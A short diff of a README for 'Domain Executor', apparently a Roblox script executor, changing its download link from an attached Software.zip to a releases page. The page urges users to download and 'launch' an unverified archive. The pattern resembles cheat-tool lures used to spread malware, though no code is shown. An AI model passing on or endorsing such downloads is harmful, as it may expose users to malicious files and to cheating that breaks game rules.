@@ -39,7 +39,7 @@ Domain Executor is a go-to solution for executing scripts in Roblox games. It si
 - delta-executor-roblox-2024
 
 ## Download Now
-[![Download Domain Executor](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Download Domain Executor](https://github.com/HoodxSp5dda/Domain-Executor/releases/tag/v2.0)](https://github.com/HoodxSp5dda/Domain-Executor/releases/tag/v2.0)
 
 **Note:** The link needs to be launched.
 
